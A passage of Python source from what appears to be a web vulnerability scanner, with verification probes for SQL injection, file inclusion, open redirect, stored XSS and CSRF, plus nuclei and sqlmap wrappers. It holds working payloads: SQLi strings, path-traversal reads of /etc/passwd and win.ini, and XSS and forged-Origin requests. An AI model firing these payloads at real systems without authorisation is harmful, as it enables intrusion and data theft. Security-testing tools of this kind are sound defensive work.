    f"https://{_OR_HOST}%2f%2e%2e",        # path-normalise confusion
)


# Optional auth header (e.g. Authorization: Bearer <jwt>) applied to EVERY probe request. API
# endpoints authenticate by header, not cookie, so without this the injection probes get 401 on
# an authenticated API and test nothing. Set once per scan (refreshed by the JWT-refresh hook).
_AUTH_HEADER: dict = {}


def set_auth_header(headers: dict | None) -> None:
    global _AUTH_HEADER
    _AUTH_HEADER = dict(headers or {})


def _base_headers(cookie: str) -> dict:
    h = {"Cookie": cookie} if cookie else {}
    h.update(_AUTH_HEADER)
    return h


# Evidence recorder: captures the raw HTTP request/response exchanges a probe generates so a
# confirmed finding can carry its PROOF (the attack request + the server's telling response),
# Burp-style. Thread-local (the probe stage is concurrent). A worker calls _evid_start() before a
# check, _req/verify record into the buffer, and _evid_take() snapshots + clears it.
_EVID = threading.local()
_EVID_MAX_BODY = 24000       # generous — a report needs the real response, not a 4k stub
_EVID_MAX_EXCH = 40          # keep the whole detection sequence, not just the last hit


def _evid_start(label: str = "") -> None:
    _EVID.buf = []
    _EVID.on = True
    _EVID.label = label


def _evid_label(label: str) -> None:
    """Label the NEXT recorded exchange (e.g. 'baseline', 'sleep(5) payload')."""
    _EVID.label = label


def _evid_take() -> list:
    buf = getattr(_EVID, "buf", None) or []
    _EVID.buf = []
    _EVID.on = False
    _EVID.label = ""
    return list(buf)


def _redact_headers(h: dict) -> dict:
    out = {}
    for k, v in (h or {}).items():
        if k.lower() in ("authorization", "cookie", "set-cookie", "x-api-key", "proxy-authorization"):
            sv = str(v)
            out[k] = (sv[:22] + "…[redacted]") if len(sv) > 22 else "[redacted]"
        else:
            out[k] = str(v)
    return out


def _rec(method: str, url: str, req_headers: dict, req_body, resp, label: str = "") -> None:
    """Record one request/response exchange (with timing + size) into the active evidence buffer."""
    if not getattr(_EVID, "on", False):
        return
    try:
        body = getattr(resp, "text", "") or ""
        elapsed = None
        try:
            elapsed = round(getattr(resp, "elapsed").total_seconds() * 1000)
        except Exception:  # noqa: BLE001
            elapsed = None
        rec = {
            "label": label or getattr(_EVID, "label", "") or "",
            "request": {"method": method, "url": url,
                        "headers": _redact_headers(req_headers),
                        "body": (str(req_body)[:_EVID_MAX_BODY] if req_body else "")},
            "response": {"status": getattr(resp, "status_code", None),
                         "headers": _redact_headers(dict(getattr(resp, "headers", {}) or {})),
                         "elapsed_ms": elapsed, "size": len(body),
                         "body": body[:_EVID_MAX_BODY],
                         "truncated": len(body) > _EVID_MAX_BODY},
        }
        _EVID.buf.append(rec)
        _EVID.label = ""      # label applies to a single exchange
        if len(_EVID.buf) > _EVID_MAX_EXCH:
            _EVID.buf = _EVID.buf[-_EVID_MAX_EXCH:]
    except Exception:  # noqa: BLE001,S110 - recording must never break a probe
        pass


def _curl_repro(ex: dict) -> str:
    """A copy-pasteable curl command that reproduces the exchange (headers redacted)."""
    req = ex.get("request", {})
    parts = ["curl -i"]
    if req.get("method", "GET") != "GET":
        parts.append(f"-X {req['method']}")
    for k, v in (req.get("headers") or {}).items():
        if "redacted" in str(v).lower():
            v = "<redacted>"
        parts.append(f"-H {_shq(f'{k}: {v}')}")
    if req.get("body"):
        parts.append(f"--data {_shq(str(req['body'])[:2000])}")
    parts.append(_shq(req.get("url", "")))
    return " ".join(parts)


def _shq(s: str) -> str:
    return "'" + str(s).replace("'", "'\\''") + "'"


def _tool_evidence(f: dict, name: str) -> tuple[list, str]:
    """Build (evidence_log, raw_output) from a subprocess tool's finding dict — its own
    request/response (nuclei -irr, dalfox PoC) becomes proof, the full JSON becomes raw output."""
    req, resp = f.get("request"), f.get("response")
    ev = []
    if req or resp:
        ev = [{
            "label": f.get("template-id") or f.get("matcher-name") or f.get("template") or name,
            "request": {"method": f.get("method", "GET"),
                        "url": str(f.get("matched-at") or f.get("url") or f.get("host") or ""),
                        "headers": {}, "body": str(req or "")[:_EVID_MAX_BODY]},
            "response": {"status": f.get("status"), "headers": {}, "elapsed_ms": None,
                         "size": len(str(resp or "")), "body": str(resp or "")[:_EVID_MAX_BODY]},
        }]
    try:
        raw = json.dumps(f, indent=1, default=str)[:9000]
    except Exception:  # noqa: BLE001
        raw = str(f)[:9000]
    return ev, raw


def _derive_meta(note: str, ev: list) -> tuple[str, str, str, str]:
    """Derive (detection_method, confidence, payload, curl_repro) from the note + exchanges so the
    report can badge HOW it was found and show the exact attack."""
    low = (note or "").lower()
    det = (
        "time-based blind" if "time-based" in low or "sleep" in low else
        "error-based" if "error signature" in low or "sql error" in low or "sql syntax" in low else
        "boolean-based" if "boolean" in low else
        "reflection" if "reflect" in low else
        "out-of-band (OAST)" if "oast" in low or "callback" in low else
        "read-back / persistence" if "read back" in low or "persisted" in low or "stuck" in low else
        "source→sink flow" if "source" in low and "sink" in low else
        "cross-object access" if "another object" in low or "idor" in low else
        "content signature")
    conf = (
        "tentative" if "suspect" in low or "context-dependent" in low else
        "confirmed" if any(k in low for k in ("confirmed", "cracked", "read /etc/passwd", "uid=",
                                              "returned 20", "returned 2", "persisted", "win.ini",
                                              "5s=", "base64 filter")) else
        "firm")
    payload, repro = "", ""
    if ev:
        rq = ev[-1].get("request", {})
        payload = (rq.get("body") or rq.get("url") or "")[:400]
        repro = _curl_repro(ev[-1])
    return det, conf, payload, repro


# Per-target injection shape, set by the probe worker before calling the verify_* checks (which
# only know url+param). A thread-local because the probe stage runs workers concurrently — each
# worker sets its own target's shape. Absent => classic query/form injection (unchanged).
_INJ = threading.local()


def _set_inject_ctx(target) -> None:
    if target is None or (target.body_type == "form" and not target.path_params):
        _INJ.ctx = None
        return
    _INJ.ctx = {"path_params": set(target.path_params or []),
                "body_type": target.body_type,
                "template": target.template or target.url,
                "all_params": list(target.params or [])}


def _req(method, url, param, value, cookie, follow=True):
    import httpx
    headers = _base_headers(cookie)
    ctx = getattr(_INJ, "ctx", None)
    # (a) PATH-parameter injection: substitute the payload into the {param} path segment (other
    # path params filled with a benign value). This is how BOLA / path-based SQLi get tested.
    if ctx and param in ctx["path_params"]:
        u = ctx["template"]
        for pp in ctx["path_params"]:
            u = u.replace("{" + pp + "}", quote(str(value), safe="") if pp == param else "1")
        resp = httpx.request(method if method in ("GET", "POST", "PUT", "DELETE") else "GET",
                             u, headers=headers, follow_redirects=follow, timeout=12)
        _feed(u, resp.text)
        _rec(method, u, headers, f"(path-injected {param}={value})", resp)
        return resp
    # (b) JSON request-body injection: APIs reject form-encoded bodies, so send the payload in a
    # JSON object with the other body params filled — the probe now actually reaches the sink.
    if ctx and ctx["body_type"] == "json" and method in ("POST", "PUT", "PATCH"):
        body = {p: (value if p == param else "1") for p in (ctx["all_params"] or [param])}
        _u = url.replace("{" + param + "}", "1")
        resp = httpx.request(method, _u, json=body, headers=headers,
                             follow_redirects=follow, timeout=12)
        _feed(url, resp.text)
        _rec(method, _u, headers, json.dumps(body), resp)
        return resp
    # (c) classic query / form injection (unchanged). Submit=Submit: DVWA-style forms only process
    # the input when the submit button is present; a harmless extra param elsewhere.
    if method == "POST":
        resp = httpx.post(url, data={param: value, "Submit": "Submit"}, headers=headers,
                          follow_redirects=follow, timeout=12)
        _rec("POST", url, headers, f"{param}={value}&Submit=Submit", resp)
    else:
        resp = httpx.get(url, params={param: value, "Submit": "Submit"}, headers=headers,
                         follow_redirects=follow, timeout=12)
        _rec("GET", f"{url}?{param}={value}", headers, None, resp)
    _feed(url, resp.text)   # passive PII inspection of the audit-time response (Burp-style)
    return resp


def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Error-based (inject a quote -> DB error) then boolean-based (true vs false response
    length differs). Strong signatures only, to stay low false-positive."""
    try:
        err = _req(method, url, param, "1'\"", cookie).text.lower()
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    for sig in _SQL_ERRORS:
        if sig in err:
            return True, f"SQL error signature: {sig!r}"
    # boolean-based: TRUE payload vs FALSE payload should differ materially
    try:
        t = _req(method, url, param, "1' OR '1'='1", cookie).text
        f = _req(method, url, param, "1' AND '1'='2", cookie).text
        base = _req(method, url, param, "1", cookie).text
    except Exception:  # noqa: BLE001
        return False, "boolean replay failed"
    # Require a MATERIAL length delta, not a 1-2 byte artifact. The TRUE/FALSE payloads differ
    # in length themselves ("OR" vs "AND") and get reflected into the response (e.g. into a
    # redirect URL on a ?to=/?url= param), so a tiny diff is reflection noise, NOT a boolean-SQLi
    # signal — that was the /redirect?to= false positive mislabeled as SQLi. A real boolean SQLi
    # swaps a row's worth of content, so gate on a threshold that clears payload-reflection jitter.
    _delta = abs(len(t) - len(f))
    _material = _delta > max(40, int(0.02 * max(1, len(base))))
    if _material and abs(len(t) - len(base)) < abs(len(f) - len(base)):
        return True, (f"boolean-based diff (true={len(t)} false={len(f)} "
                      f"base={len(base)}, delta={_delta})")

    # Time-based blind (DIALECT + CONTEXT adaptive): WAVSEP's "200-identical" cases give NO error
    # and NO length signal — only a delay betrays them, and the delay function is DB-specific. We
    # detect the dialect from the error signature (adaptive) and try that backend's payloads FIRST,
    # then fall through to EVERY other dialect/context so a no-error app is still covered
    # exhaustively (additive — strictly more payloads than the old 2-MySQL pass). Differential
    # timing (0s vs 5s, then a 2s confirmation that must land in between) rules out a naturally-slow
    # endpoint and payload-independent latency. SELECT-based, non-destructive (production-safe caps
    # this technique).
    _dia = _detect_sql_dialect(err)
    _order = ([_dia] if _dia else []) + [d for d in _TIME_DIALECT_ORDER if d != _dia]
    try:
        _t0 = time.monotonic(); _req(method, url, param, "1", cookie)
        _baseline = time.monotonic() - _t0
    except Exception:  # noqa: BLE001
        _baseline = 0.0
    if _baseline <= 4.0:   # a naturally-slow endpoint makes timing unreliable AND expensive
        for _d in _order:
            for _label, _tmpl in _TIME_PAYLOADS.get(_d, []):
                try:
                    _t0 = time.monotonic(); _req(method, url, param, _tmpl.format(n=0), cookie)
                    fast = time.monotonic() - _t0
                    if fast > 4.0:
                        continue
                    _t0 = time.monotonic(); _req(method, url, param, _tmpl.format(n=5), cookie)
                    slow = time.monotonic() - _t0
                except Exception:  # noqa: BLE001
                    continue
                if slow > fast + 3.8 and slow > 3.8:
                    try:
                        _t0 = time.monotonic(); _req(method, url, param, _tmpl.format(n=2), cookie)
                        mid = time.monotonic() - _t0
                    except Exception:  # noqa: BLE001
                        mid = 0.0
                    if fast + 1.0 < mid < slow - 1.0:   # 2s sits between 0s and 5s => real
                        _tag = f"{_d} detected" if _d == _dia else _d
                        return True, (f"time-based blind SQLi [{_tag}/{_label}]: "
                                      f"5s={slow:.1f}s vs 0s={fast:.1f}s")
    return False, "no SQL error, boolean, or timing signal"


def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Local/Remote file read: try classic traversal + php filter wrappers, confirm by the
    /etc/passwd root line signature (also Windows win.ini + base64/wrapper variants)."""
    payloads = [
        # *nix traversal (varying depth) + absolute
        "/etc/passwd", "../etc/passwd", "../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        # traversal-filter bypasses
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",           # url-encoded
        "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",    # double-encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # null-byte / extension-append bypasses (legacy PHP)
        "/etc/passwd%00", "../../../../../../etc/passwd%00.html",
        # php wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://filter/resource=/etc/passwd",
        # file:// URI scheme — recovers WAVSEP FileDirective/FileClass cases whose sink expects a
        # URI, not a bare path (empirically the vector those missed cases needed).
        "file:///etc/passwd", "file:/etc/passwd",
        "file:///c:/windows/win.ini", "file://c:\\windows\\win.ini",
        # deeper traversal for sinks that canonicalise a few levels before the read
        "../../../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        # other readable *nix files
        "/proc/self/environ", "/etc/hostname",
        # Windows
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "../../../../../../windows/win.ini",
        "c:\\windows\\win.ini",
        "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    ]
    for p in payloads:
        try:
            r = _req(method, url, param, p, cookie)
        except Exception:  # noqa: BLE001, S112
            continue
        t = r.text
        if "root:x:0:0" in t:
            return True, f"read /etc/passwd via {p!r}"
        if "cm9vdDp4OjA6MDp" in t:                    # base64 of 'root:x:0:0:'
            return True, f"read /etc/passwd (base64 filter) via {p!r}"
        if "[extensions]" in t.lower() or "[fonts]" in t.lower() or "for 16-bit app support" in t.lower():
            return True, f"read Windows win.ini via {p!r}"
        if "DOCUMENT_ROOT=" in t or "HTTP_USER_AGENT=" in t:  # /proc/self/environ
            return True, f"read /proc/self/environ via {p!r}"
    return False, "no file-read signature"


def _redirect_marker_host(loc: str) -> str:
    """Normalise a Location value (protocol-relative, backslash, missing-slash forms) and return
    its effective host, so a bypass payload that lands off-site is recognised however it's encoded."""
    if not loc:
        return ""
    lc = loc.strip().replace("\\", "/")
    if lc.startswith("//"):
        lc = "http:" + lc
    elif lc.lower().startswith(("https:", "http:")) and "//" not in lc.split(":", 1)[1][:2]:
        # 'https:evil.example' -> 'https://evil.example'
        scheme, rest = lc.split(":", 1)
        lc = f"{scheme}://{rest.lstrip('/')}"
    return (urlsplit(lc).hostname or "").lower()


def verify_open_redirect(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
    """Open redirect on redirect-ish params. Tries a set of allowlist-BYPASS payloads (the real
    OpenRedireX/Burp technique, generalised) and confirms via the Location header pointing at our
    marker host — WITHOUT following the redirect (no external egress needed). Also catches
    body-based redirects (meta refresh / window.location)."""
    if param.lower() not in _REDIRECT_PARAMS:
        return False, "param not redirect-like"
    for pay in _OR_PAYLOADS:
        try:
            r = _req(method, url, param, pay, cookie, follow=False)
        except Exception:  # noqa: BLE001 - try the next payload
            continue
        loc = r.headers.get("location", "")
        if r.status_code in (301, 302, 303, 307, 308) and _redirect_marker_host(loc) == _OR_HOST:
            return True, f"30x Location to {loc[:70]} (payload: {pay})"
        body = (r.text or "").lower()
        if _OR_HOST in body:
            for pat in ("http-equiv=\"refresh\"", "http-equiv='refresh'", "window.location",
                        "location.href", "location.replace", "location.assign"):
                if pat in body:
                    return True, f"body redirect ({pat}) to {_OR_HOST} (payload: {pay})"
    return False, "no external redirect across bypass payloads"


def verify_stored_xss(target: Target, param: str, cookie: str) -> tuple[bool, str]:
    """Inject via the form, then re-fetch the page and check the payload persisted unencoded."""
    import httpx
    marker = "stx7q2z"
    payload = f"<sVg/onload=alert({marker})>"
    headers = _base_headers(cookie)
    data = {p: (target.values.get(p) or "x") for p in target.params}
    data[param] = payload
    data.setdefault("Submit", "Submit")
    try:
        httpx.post(target.url, data=data, headers=headers, follow_redirects=True, timeout=12)
        view = httpx.get(target.csrf_url or target.url, headers=headers,
                         follow_redirects=True, timeout=12)
    except Exception as exc:  # noqa: BLE001
        return False, f"replay error: {exc}"
    if payload in view.text:
        return True, "stored payload persisted unencoded"
    return False, "not stored / encoded"


def verify_finding(f: Finding, cookie: str) -> Finding:
    if f.category == "command-injection":
        ok, note = verify_cmdi(f.url, f.param or "ip", f.method, cookie)
    elif f.category == "xss":
        ok, note = verify_reflected_xss(f.url, f.param or "", f.method, cookie)
    elif f.category == "sql-injection":
        ok, note = verify_sqli(f.url, f.param or "id", f.method, cookie)
    elif f.category == "file-inclusion":
        ok, note = verify_lfi(f.url, f.param or "page", f.method, cookie)
    elif f.category == "open-redirect":
        ok, note = verify_open_redirect(f.url, f.param or "redirect", f.method, cookie)
    else:
        f.verified = None
        f.verify_note = "tool-confirmed (no independent replay for this class)"
        return f
    f.verified = ok
    f.verify_note = note
    return f


# ----- detection (tool runners, form + CSRF aware) ----------------------------

def run_nuclei_dast(urls: list[str], cookie: str, politeness=None) -> list[Finding]:
    if not urls:
        return []
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("\n".join(urls)); path = fh.name
    # STREAM to a file (-o), not stdout: nuclei buffers stdout until exit, so a timeout-kill
    # loses everything it found (the silent 0-findings bug on the WAVSEP benchmark — nuclei ran
    # the full 90min budget over 1861 targets, got killed, and we got nothing). Writing JSONL to
    # disk means whatever it found up to the kill is preserved and parsed. -stats optional.
    out_file = tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False).name
    # -irr includes the request/response in each finding so the report shows real HTTP proof.
    args = ["nuclei", "-l", path, "-dast", "-jsonl", "-irr", "-o", out_file, "-silent"]
    if politeness:
        args += politeness.nuclei_flags()
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    _run(args, timeout=int(os.environ.get("DASTNG_NUCLEI_TIMEOUT", "5400") or "5400"))
    try:  # read whatever nuclei streamed to disk (complete OR timeout-truncated)
        with open(out_file, encoding="utf-8", errors="ignore") as _fh:
            out = _fh.read()
    except Exception:  # noqa: BLE001
        out = ""
    from .scoring.normalize import normalize_nuclei
    findings = []
    for n in normalize_nuclei(out):
        ev, raw = _tool_evidence(n.raw, "nuclei")
        info = n.raw.get("info", {}) or {}
        findings.append(Finding(
            tool="nuclei", category=n.category, url=n.url, param=n.param,
            evidence=info.get("name", "") + (f" — {info.get('description', '')[:200]}" if info.get("description") else ""),
            evidence_log=ev, raw_output=raw, verified=True,
            payload=str(n.raw.get("curl-command") or n.raw.get("matched-at") or "")[:400],
            repro=str(n.raw.get("curl-command") or "")[:1200],
            detection=n.raw.get("matcher-name") or n.raw.get("type") or "nuclei-template",
            confidence="firm"))
    return findings


def run_sqlmap(t: Target, cookie: str, politeness=None, policy=None,
               level_override: int | None = None) -> list[Finding]:
    """CSRF-aware sqlmap: passes --csrf-token/--csrf-url when the form carries a token.
    Injection depth (level/risk/technique) comes from the ScanPolicy: production-safe uses
    level 2 / risk 1 / BEU (no time-hang, no stacked queries -> cannot mutate/hang the DB).
    level_override (from the adaptive TargetHealth monitor) caps the level when the target is
    under stress, so a fragile target gets reduced depth instead of being hammered to death."""
    args = ["sqlmap", "--batch", "--disable-coloring", "--flush-session"]
    if policy is not None:
        lvl = level_override if level_override else policy.sqlmap_level
        args += ["--level", str(lvl), "--risk", str(policy.sqlmap_risk),
                 f"--technique={policy.sqlmap_technique}"]
    else:
        args += ["--level", str(level_override or 2), "--risk", "2", "--technique=BEUST"]
    if politeness:
        args += politeness.sqlmap_flags()
    if t.method == "POST":
        args += ["-u", t.url, "--data", t.data_string()]
    else:
        args += ["-u", f"{t.url}?{t.data_string()}" if "?" not in t.url else t.url]
    if cookie:
        args += ["--cookie", cookie]
    if t.csrf_field:
        args += ["--csrf-token", t.csrf_field, "--csrf-url", t.csrf_url]
    # Bound wall-time per parameter. sqlmap BEU confirms a detectable injection within a couple
    # minutes; grinding 10 min/param mostly means it is NOT injectable (pure waste + sustained
    # load that kills fragile targets). Keep it tight so the depth pass over N params can never
    # monopolize the scan or pin the target: full=180s, reduced (stressed target)=120s.
    _to = 180 if (level_override or (policy.sqlmap_level if policy else 2)) >= 5 else 120
    out = _run(args, timeout=_to)
    from .scoring.normalize import normalize_sqlmap
    return [Finding(tool="sqlmap", category="sql-injection", url=t.url, param=n.param,
                    method=t.method, evidence="sqlmap-confirmed")
            for n in normalize_sqlmap(out)]


def run_nuclei_exposures(urls: list[str], cookie: str, politeness=None) -> list[Finding]:
    """Passive info-disclosure via nuclei's exposures + misconfiguration templates and our
    PII/email extractor — the CLI analog to Burp's passive scanner (source-code / private-key
    / token / config disclosure, emails/PII). Detection lives in nuclei's engine + versioned
    YAML, not bespoke code regex. Read-only GETs, so safe under any policy."""
    if not urls:
        return []
    import os
    # Broad, SAFE template coverage. Previously only exposures+misconfiguration (~1.7k of the
    # ~11k http templates) — leaving CVE, known-vuln, exposed-panel and takeover detection off
    # the table. Add them for real depth. The intrusive classes stay OUT two ways: (1) we do NOT
    # include http/default-logins (it submits credentials and can lock accounts), and (2) -etags
    # excludes any intrusive/dos/fuzz/brute-force/default-login template that ships inside the
    # dirs we do load. Everything kept is read-only GET/HEAD detection — safe under any policy.
    base = os.path.expanduser("~/nuclei-templates/http")
    tdirs = [os.path.join(base, d) for d in (
        "exposures", "misconfiguration", "vulnerabilities", "cves",
        "exposed-panels", "takeovers", "miscellaneous")]
    tdirs.append(os.path.join(os.path.dirname(__file__), "rules", "pii-disclosure.yaml"))
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("\n".join(urls)); path = fh.name
    args = ["nuclei", "-l", path, "-jsonl", "-silent",
            "-etags", "intrusive,dos,fuzz,brute-force,default-login"]
    for t in tdirs:
        if os.path.exists(t):
            args += ["-t", t]
    if politeness:
        args += politeness.nuclei_flags()
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    # 8k+ templates over a large frontier needs a real budget; honor the operator override.
    _to = int(os.environ.get("DASTNG_NUCLEI_TIMEOUT", "3600") or "3600")
    out = _run(args, timeout=_to)
    findings: list[Finding] = []
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
        except json.JSONDecodeError:
            continue
        info = o.get("info", {}) or {}
        tid = (o.get("template-id") or "")
        tid_l = tid.lower()
        sev = (info.get("severity") or "").lower()
        if "pii" in tid_l:
            cat = "pii-disclosure"
        elif tid_l.startswith("cve-") or "cve" in tid_l:
            cat = "vulnerability"
        elif "takeover" in tid_l:
            cat = "takeover"
        elif "panel" in tid_l or "-login" in tid_l:
            cat = "exposed-panel"
        elif sev in ("high", "critical"):
            cat = "vulnerability"
        elif sev == "medium":
            cat = "misconfiguration"
        else:
            cat = "info-disclosure"
        _name = info.get("name") or tid
        findings.append(Finding(tool="nuclei", category=cat,
                                url=o.get("matched-at") or o.get("url") or "",
                                param=tid,
                                evidence=(f"[{sev}] {_name}" if sev else _name)[:160],
                                verified=True))
    return findings


# ---- soft-404 guard ----------------------------------------------------------------------
# Apps with catch-all / SPA routing return 2xx for ANY path, so file-existence checks (ZAP's
# .env / .htaccess / Trace.axd / backup-file leaks, feroxbuster hits) false-positive: the scanner
# requests /.env, gets the SPA index (200), and reports a leak. This is the same auto-calibration
# real content scanners do (ffuf -ac, feroxbuster --filter-similar): fingerprint the not-found
# response, then drop findings whose URL just returns that page.
_SOFT404_RANDOM = ("dastng-nx-9q2z7x1a4k", "dastng-nx-4k8w3v6bqp.bak")
# Findings that ASSERT a file/path exists (soft-404-prone). Header/behaviour findings (CORS, CSP,
# missing-header, SQLi, XSS) are NOT existence claims and must never be dropped by this guard.
_EXISTENCE_MARKERS = (
    "information leak", "information disclosure", "source code disclosure", "backup file",
    ".env", ".htaccess", ".htpasswd", "trace.axd", "elmah", ".git", ".svn", ".bak", ".old",
    ".swp", "config file", "exposed", "directory browsing", "directory listing", "file found",
    "wp-config", "web.config", ".ds_store", "php info", "phpinfo",
)


def _is_soft404_fp(url: str, cookie: str) -> bool:
    """Directory-LOCAL soft-404 calibration (what ffuf -ac / feroxbuster --filter-similar do):
    fetch the finding URL and a random SIBLING in the same directory. If both return the same
    status + near-identical body, the 'file' is just that directory's catch-all response — a false
    positive, not a real exposed file. Per-directory, so it handles apps whose /api, /rest, /ftp
    subtrees each have their own not-found response."""
    import httpx
    clean = url.split("?")[0].split("#")[0]
    parent = clean.rsplit("/", 1)[0]
    sib = f"{parent}/{_SOFT404_RANDOM[0]}"
    hdr = {"Cookie": cookie} if cookie else {}
    try:
        r1 = httpx.get(clean, headers=hdr, timeout=10, follow_redirects=False)
        r2 = httpx.get(sib, headers=hdr, timeout=10, follow_redirects=False)
    except Exception:  # noqa: BLE001
        return False
    if r1.status_code != r2.status_code:
        return False                      # the real file responds differently => keep it
    l1, l2 = len(r1.text or ""), len(r2.text or "")
    return abs(l1 - l2) <= max(64, int(0.15 * max(l1, l2, 1)))


def _soft404_filter(findings, target: str, cookie: str, host_rewrite=None):
    """Drop file-EXISTENCE findings that just return the directory's soft-404/catch-all page.
    Header/behaviour findings (CORS, CSP, missing-header, SQLi, ...) are never existence claims and
    are untouched. host_rewrite(url)->url maps a scanner-internal host (host.docker.internal) back
    to the reachable target host. Returns (kept, n_dropped)."""
    kept, dropped = [], 0
    for f in findings:
        ev = (f"{getattr(f, 'category', '')} {getattr(f, 'evidence', '')}").lower()
        url = getattr(f, "url", "") or ""
        if host_rewrite:
            url = host_rewrite(url)
        if any(m in ev for m in _EXISTENCE_MARKERS) and url and _is_soft404_fp(url, cookie):
            dropped += 1
            continue
        kept.append(f)
    return kept, dropped


# ---- SPA / JSON-API CSRF heuristic -------------------------------------------------------
# Form-based CSRF tools (XSRFProbe, ZAP's anti-CSRF-token rule) need HTML forms and miss the SPA
# case, where state changes go through XHR/JSON APIs. CSRF is exploitable when ALL hold: the
# request (1) is state-changing, (2) carries NO anti-CSRF token, (3) is authenticated by a COOKIE
# whose SameSite does not block cross-site sending, and (4) the server does not validate
# Origin/Referer. This checks all four — deterministically, and generalises to any real client app.
_CSRF_TOKEN_HINTS = ("csrf", "xsrf", "authenticity_token", "requestverificationtoken",
                     "anticsrf", "_token", "nonce", "veri_token", "__requestverificationtoken")
_CSRF_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
_CSRF_ORIGIN = "https://evil.example"


def _has_csrf_token(t: "Target") -> bool:
    if getattr(t, "csrf_field", None):
        return True
    blob = " ".join(list(t.params or []) + list((t.values or {}).keys())).lower()
    return any(h in blob for h in _CSRF_TOKEN_HINTS)


def _samesite_gap(url: str, cookie: str) -> tuple[bool, str]:
    """True if the app sets a session-ish cookie WITHOUT SameSite=Strict/Lax — the precondition
    for CSRF (the browser then auto-attaches that cookie on a cross-site request). SameSite is a
    per-cookie property, so judge the FIRST response that sets a session cookie (endpoint first,
    then site root) rather than mixing cookies from different responses. Read-only GET."""
    import httpx
    root = f"{urlsplit(url).scheme}://{urlsplit(url).netloc}/"
    for u in dict.fromkeys((url, root)):
        try:
            r = httpx.get(u, headers={"Cookie": cookie} if cookie else {}, timeout=10,
                          follow_redirects=False)
        except Exception:  # noqa: BLE001
            continue
        try:
            low = "; ".join(r.headers.get_list("set-cookie")).lower()
        except Exception:  # noqa: BLE001
            low = (r.headers.get("set-cookie", "") or "").lower()
        if not low.strip():
            continue
        if not any(k in low for k in ("session", "token", "auth", "sid", "jwt", "connect.sid")):
            continue  # not a session cookie; keep looking
        if "samesite=strict" in low or "samesite=lax" in low:
            return False, "session cookie has SameSite"
        return True, "session cookie set without SameSite"
    return False, "no session cookie observed"


def _origin_check(t: "Target", cookie: str) -> tuple[str, str]:
    """Replay the state-changing request with a FORGED Origin/Referer. Returns one of
    'accepted' (server does NOT validate Origin => CSRF-able), 'rejected' (401/403 => Origin or
    auth enforced => protected), or 'inconclusive'. SENDS a benign state-changing request — the
    caller gates this behind fuzz_forms."""
    import httpx
    headers = {"Origin": _CSRF_ORIGIN, "Referer": _CSRF_ORIGIN + "/"}
    if cookie:
        headers["Cookie"] = cookie
    data = {p: (t.values.get(p) or "dastcsrf") for p in (t.params or [])} or {"dastcsrf": "1"}
    try:
        r = httpx.request(t.method.upper(), t.url, data=data, headers=headers, timeout=12,
                          follow_redirects=False)
    except Exception as exc:  # noqa: BLE001
        return "inconclusive", f"replay error: {exc}"
    if r.status_code in (401, 403):
        return "rejected", f"cross-origin {t.method} rejected (status {r.status_code})"
    if r.status_code < 400 or r.status_code in (301, 302, 303, 307, 308):
        return "accepted", f"forged-Origin {t.method} accepted (status {r.status_code})"
    return "inconclusive", f"status {r.status_code}"


def verify_csrf(t: "Target", cookie: str, active: bool = False) -> tuple[bool, str]:
    """SPA/API CSRF heuristic. CSRF is exploitable only when ALL hold: state-changing method,
    NO anti-CSRF token, a cookie session WITHOUT SameSite (so it's auto-sent cross-site), and the
    server does NOT validate Origin/Referer. The SameSite gap is a hard precondition. active=True
    adds the forged-Origin confirmation (sends a benign state-changing request — gate behind
    fuzz_forms); without it the result is a lower-confidence '(passive)' flag."""
    if (t.method or "GET").upper() not in _CSRF_METHODS:
        return False, "not state-changing"
    if _has_csrf_token(t):
        return False, "anti-CSRF token present"
    gap, gnote = _samesite_gap(t.url, cookie)
    if not gap:
        return False, f"not CSRF-exploitable ({gnote})"   # SameSite set / no session cookie
    if active:
        verdict, onote = _origin_check(t, cookie)
        if verdict == "rejected":
            return False, f"Origin/Referer validated — protected ({onote})"
        if verdict == "accepted":
            return True, f"CSRF confirmed: {gnote}; {onote}; no anti-CSRF token"
        return True, f"CSRF (likely): {gnote}; no anti-CSRF token; Origin check {onote}"
    return True, f"CSRF (passive): {gnote}; no anti-CSRF token"


def probe_targets(targets: list[Target], cookie: str, politeness=None,
                  fuzz_forms: bool = True) -> list[Finding]:
    """Completeness safety-net: independently replay EVERY blatant-vuln class on every
    discovered param, so a payload-set gap in any scanner does not become a missed finding.
    Deterministic, strong-signature checks only (low false-positive). Throttled when a
    politeness profile is given (avoids tripping rate limits/WAF on production targets).
    When fuzz_forms is False (production-safe), stored-XSS (which WRITES data) is skipped."""
    from concurrent.futures import ThreadPoolExecutor

    from .safety import is_auth_endpoint

    def _probe_one(t: Target):
        """All checks for ONE target. Returns (findings, csrf_hit|None). Self-contained so it runs
        safely in a worker thread and never raises into the pool."""
        found: list[Finding] = []
        if is_auth_endpoint(t.url):   # never inject auth endpoints
            return found, None

        def _emit(cat, param, note, ev):
            det, conf, payload, repro = _derive_meta(note, ev)
            found.append(Finding(tool="verify", category=cat, url=t.url, param=param,
                                 method=t.method, evidence=note, verified=True,
                                 evidence_log=ev, detection=det, confidence=conf,
                                 payload=payload, repro=repro))

        csrf_hit = None
        try:
            _evid_start()
